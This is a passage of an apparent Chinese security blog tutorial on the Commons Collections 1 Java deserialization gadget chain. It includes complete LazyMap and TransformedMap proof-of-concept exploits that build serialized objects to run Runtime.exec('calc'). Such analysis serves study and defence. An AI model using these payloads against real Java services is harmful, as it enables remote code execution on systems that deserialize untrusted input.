NULL_INSTANCE : <span class="keyword">new</span> ConstantTransformer(constantToReturn));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.iConstant = constantToReturn;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.iConstant;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getConstant</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.iConstant;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进入InvokerTransformer类中，transform方法有反射获取方法并调用的操作</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.iMethodName = methodName;</span><br><span class="line">    <span class="keyword">this</span>.iParamTypes = paramTypes;</span><br><span class="line">    <span class="keyword">this</span>.iArgs = args;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (input == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class cls = input.getClass();</span><br><span class="line">            Method method = cls.getMethod(<span class="keyword">this</span>.iMethodName, <span class="keyword">this</span>.iParamTypes);</span><br><span class="line">            <span class="keyword">return</span> method.invoke(input, <span class="keyword">this</span>.iArgs);</span><br><span class="line">        &#125;……</span><br></pre></td></tr></table></figure><p>反射如何调用runtime？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Class run = Class.forName(<span class="string">"java.lang.Runtime"</span>);</span><br><span class="line">        Method getrun = run.getMethod(<span class="string">"getRuntime"</span>);</span><br><span class="line">        Method exec = run.getMethod(<span class="string">"exec"</span>,String<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        exec.invoke(getrun.invoke(run),<span class="string">"calc"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反射调用需要获取类的名字，一般用Class.fotname获取，之后从这个类中使用getMethod获取需要调用的方法，最后用invoke方法调用这个方法。这里以Runtime类为例子，首先获取Runtime类的类名，然后获取getRuntime静态方法，因为Runtime类的构造函数是私有方法，只能用getRuntime方法获取类的实例，之后获取Runtime的exec方法，这个方法是执行命令的方法，也需要获取，exec不是静态方法，在invoke方法中需要传入object，所以，需要先调用getRuntime生成Runtime的对象，getRuntime方法是静态方法，他在调用invoke需要传入的是类名，反射调用时，满足以上条件后就能弹出计算器。</p><p>最后看一下ChainedTransformer类，transform方法遍历执行类实例化时传入的数组元素对象的transform，刚好提供了漏洞利用链</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.iTransformers = transformers;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.iTransformers.length; ++i) &#123;</span><br><span class="line">        object = <span class="keyword">this</span>.iTransformers[i].transform(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>为什么用如下代码更简单一些，这里涉及到一个坑，在反序列化的时候函数中涉及到的对象必须是实现了Serializable接口，但是在这里Runtime.getRuntime()得到的是Runtime对象，然而Runtime对象是没有实现反序列化接口的所以，这里不能这么写。要通过ChainedTransformer 实现最终的执行链。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">   Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(java.lang.Runtime.getRuntime()),</span><br><span class="line">            new InvokerTransformer("exec", new Class[]&#123;String.class&#125;, new Object[]&#123;"calc",&#125;),</span><br><span class="line">    &#125;;</span><br><span class="line">    Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">    transformerChain.transform(<span class="keyword">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面理解了核心利用链，但该如何被调用。 </p><p>CommonsCollections1 POC 涉及到了两个利用链</p><ul><li>TransformedMap </li><li>LazyMap （ysoserial 中利用链）   </li></ul><h2 id="LazyMap-利用链-POC"><a href="#LazyMap-利用链-POC" class="headerlink" title="LazyMap 利用链 POC"></a>LazyMap 利用链 POC</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ComColLazyMap1</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] serialize(<span class="keyword">final</span> Object obj) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ByteArrayOutputStream btout = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream objOut = <span class="keyword">new</span> ObjectOutputStream(btout);</span><br><span class="line">        objOut.writeObject(obj);</span><br><span class="line">        <span class="keyword">return</span> btout.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">unserialize</span><span class="params">(<span class="keyword">final</span> <span class="keyword">byte</span>[] serialized)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ByteArrayInputStream btin = <span class="keyword">new</span> ByteArrayInputStream(serialized);</span><br><span class="line">        ObjectInputStream objIn = <span class="keyword">new</span> ObjectInputStream(btin);</span><br><span class="line">        <span class="keyword">return</span> objIn.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod", new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;"getRuntime", new Class[0] &#125;),</span><br><span class="line">                new InvokerTransformer("invoke", new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[0] &#125;),</span><br><span class="line">                new InvokerTransformer("exec", new Class[] &#123;String.class &#125;, new Object[] &#123;"calc"&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        <span class="keyword">final</span> Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        <span class="keyword">final</span> Map lazyMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">        String classToSerialize = <span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>;</span><br><span class="line">        <span class="keyword">final</span> Constructor&lt;?&gt; constructor = Class.forName(classToSerialize).getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">        constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler secondInvocationHandler = (InvocationHandler) constructor.newInstance(Override<span class="class">.<span class="keyword">class</span>, <span class="title">lazyMap</span>)</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> Map testMap = <span class="keyword">new</span> HashMap();</span><br><span class="line"></span><br><span class="line">        Map evilMap = (Map) Proxy.newProxyInstance(</span><br><span class="line">                testMap.getClass().getClassLoader(),</span><br><span class="line">                testMap.getClass().getInterfaces(),</span><br><span class="line">                secondInvocationHandler</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">final</span> Constructor&lt;?&gt; ctor = Class.forName(classToSerialize).getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">        ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="keyword">final</span> InvocationHandler handler = (InvocationHandler) ctor.newInstance(Override<span class="class">.<span class="keyword">class</span>, <span class="title">evilMap</span>)</span>;</span><br><span class="line">        <span class="keyword">byte</span>[] serializeData=serialize(handler);</span><br><span class="line">        unserialize(serializeData);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用链</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">    ObjectInputStream.readObject()</span><br><span class="line">        AnnotationInvocationHandler.readObject()</span><br><span class="line">            Map(Proxy).entrySet()</span><br><span class="line">                AnnotationInvocationHandler.invoke()</span><br><span class="line">                    LazyMap.get()</span><br><span class="line">                        ChainedTransformer.transform()</span><br><span class="line">                            ConstantTransformer.transform()</span><br><span class="line">                            InvokerTransformer.transform()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    Class.getMethod()</span><br><span class="line">                            InvokerTransformer.transform()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    Runtime.getRuntime()</span><br><span class="line">                            InvokerTransformer.transform()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    Runtime.exec()</span><br><span class="line"></span><br><span class="line">Requires:</span><br><span class="line">    commons-collections</span><br></pre></td></tr></table></figure><p><img src="../../images/java/comcol/2.png" alt=""><br>进入LazyMap类中，发现在LazyMap的get方法中有一处调用transform方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">get</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">super</span>.map.containsKey(key)) &#123;</span><br><span class="line">        Object value = <span class="keyword">this</span>.factory.transform(key);</span><br><span class="line">        <span class="keyword">super</span>.map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.map.get(key);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>变量factory从LazyMap的构造方法中，factory为Transformer类型。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title">decorate</span><span class="params">(Map map, Transformer factory)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> LazyMap(map, factory);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="title">LazyMap</span><span class="params">(Map map, Transformer factory)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(map);</span><br><span class="line">        <span class="keyword">if</span> (factory == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Factory must not be null"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">this</span>.factory = factory;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>接下来就是如何处罚LazyMap中的get方法，进入AnnotationInvocationHandler中，AnnotationInvocationHandler invoke方法中调用想要的map类的get方法，同时只需要在构造方法处传入LazyMap即可</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//sun.reflect.annotation.AnnotationInvocationHandler  </span></span><br><span class="line">    AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; var1, Map&lt;String, Object&gt; var2) &#123;</span><br><span class="line">        <span class="keyword">this</span>.type = var1;</span><br><span class="line">        <span class="keyword">this</span>.memberValues = var2;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object var1, Method var2, Object[] var3)</span> </span>&#123;</span><br><span class="line">        String var4 = var2.getName();</span><br><span class="line">        Class[] var5 = var2.getParameterTypes();</span><br><span class="line">        <span class="keyword">if</span> (var4.equals(<span class="string">"equals"</span>) &amp;&amp; var5.length == <span class="number">1</span> &amp;&amp; var5[<span class="number">0</span>] == Object<span class="class">.<span class="keyword">class</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.equalsImpl(var3[<span class="number">0</span>]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">assert</span> var5.length == <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (var4.equals(<span class="string">"toString"</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">this</span>.toStringImpl();</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var4.equals(<span class="string">"hashCode"</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">this</span>.hashCodeImpl();</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var4.equals(<span class="string">"annotationType"</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">this</span>.type;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                Object var6 = <span class="keyword">this</span>.memberValues.get(var4);</span><br><span class="line">                ……</span><br></pre></td></tr></table></figure><p>AnnotationInvocationHandler实现了InvocationHandler接口，可以用 jdk 代理调用。</p><h2 id="TransformedMap-利用链-POC"><a href="#TransformedMap-利用链-POC" class="headerlink" title="TransformedMap 利用链 POC"></a>TransformedMap 利用链 POC</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Annotation;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="comment">//import sun.reflect.annotation.AnnotationInvocationHandler;</span></span><br><span class="line"><span class="keyword">import</span> sun.reflect.annotation.AnnotationParser;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ComColTestTransformedMap1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod", new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;"getRuntime", new Class[0] &#125;),</span><br><span class="line">                new InvokerTransformer("invoke", new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[0] &#125;),</span><br><span class="line">                new InvokerTransformer("exec", new Class[] &#123;String.class &#125;, new Object[] &#123;"calc"&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//将transformers数组存入ChaniedTransformer这个继承类</span></span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        <span class="comment">//创建Map并绑定transformerChina</span></span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        innerMap.put(<span class="string">"value"</span>, <span class="string">"value"</span>);</span><br><span class="line">        <span class="comment">//给予map数据转化链</span></span><br><span class="line">        Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>, transformerChain);</span><br><span class="line">        <span class="comment">//触发漏洞</span></span><br><span class="line">        Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next();</span><br><span class="line">        <span class="comment">//outerMap后一串东西，其实就是获取这个map的第一个键值对（value,value）；然后转化成Map.Entry形式，这是map的键值对数据格式</span></span><br><span class="line">        <span class="comment">//onlyElement.setValue("foobar");</span></span><br><span class="line">        <span class="comment">//反射机制调用AnnotationInvocationHandler类的构造函数</span></span><br><span class="line">        Class cl = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line">        Constructor ctor = cl.getDeclaredConstructor(Class<span class="class">.<span class="keyword">class</span>, <span class="title">Map</span>.<span class="title">class</span>)</span>;</span><br><span class="line">        <span class="comment">//取消构造函数修饰符限制</span></span><br><span class="line">        ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="comment">//获取AnnotationInvocationHandler类实例</span></span><br><span class="line">        Object instance = ctor.newInstance(Retention<span class="class">.<span class="keyword">class</span>, <span class="title">outerMap</span>)</span>;</span><br><span class="line">        FileOutputStream f = <span class="keyword">new</span> FileOutputStream(<span class="string">"p.cer"</span>);</span><br><span class="line">        ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(f);</span><br><span class="line">        out.writeObject(instance);</span><br><span class="line">        FileInputStream fi = <span class="keyword">new</span> FileInputStream(<span class="string">"p.cer"</span>);</span><br><span class="line">        ObjectInputStream in = <span class="keyword">new</span> ObjectInputStream(fi);</span><br><span class="line">        in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进入 TransformedMap 函数 </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TransformedMap</span> <span class="keyword">extends</span> <span class="title">AbstractInputCheckedMapDecorator</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">7023152376788900464L</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> Transformer keyTransformer;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> Transformer valueTransformer;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> TransformedMap(map, keyTransformer, valueTransformer);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="title">TransformedMap</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(map);</span><br><span class="line">        <span class="keyword">this</span>.keyTransformer = keyTransformer;</span><br><span class="line">        <span class="keyword">this</span>.valueTransformer = valueTransformer;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>decorate方法是返回一个TransformedMap对象，其中valueTransformer是我们传入的Transformer数组，在TransformedMap类里还有一个很重要的函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> Object <span class="title">checkSetValue</span><span class="params">(Object value)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.valueTransformer.transform(value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在setValue的时候就会触发这个函数，进入我们之前的利用链，map选择hashmap，因为他继承了反序列化接口，现在还需要一个readobject里面会调用setValue的入口来调用pop链，在jdk 7，这个入口就是sun.reflect.annotation.AnnotationInvocationHandler </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; var1, Map&lt;String, Object&gt; var2) &#123;</span><br><span class="line">       <span class="keyword">this</span>.type = var1;</span><br><span class="line">       <span class="keyword">this</span>.memberValues = var2;</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">       var1.defaultReadObject();</span><br><span class="line">       AnnotationType var2 = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           var2 = AnnotationType.getInstance(<span class="keyword">this</span>.type);</span><br><span class="line">       &#125; <span class="keyword">catch</span> (IllegalArgumentException var9) &#123;</span><br><span class="line">           <span class="keyword">return</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       Map var3 = var2.memberTypes();</span><br><span class="line">       Iterator var4 = <span class="keyword">this</span>.memberValues.entrySet().iterator();</span><br><span class="line"></span><br><span class="line">       <span class="keyword">while</span>(var4.hasNext()) &#123;</span><br><span class="line">           